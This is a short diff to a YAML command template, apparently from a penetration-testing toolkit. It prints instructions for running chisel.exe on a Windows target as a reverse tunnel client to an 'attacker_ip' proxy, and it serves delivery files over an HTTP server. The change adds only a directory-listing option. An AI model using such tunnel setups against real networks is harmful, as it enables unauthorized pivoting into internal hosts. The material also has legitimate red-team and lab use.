@@ -22,4 +22,4 @@ content: |
   echo "To run: <%=$(esh variables/delivery_path_windows)%>\chisel.exe client <%=$(esh variables/attacker_ip)%>:<%=$(esh variables/proxy_port)%> R:$kali_port:$target:$target_port"; \
   echo "Expected Result: You should be able to reach $target:$target_$port on 127.0.0.1:$kali_port"; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound <%=$(esh variables/delivery_dir_listing)%>
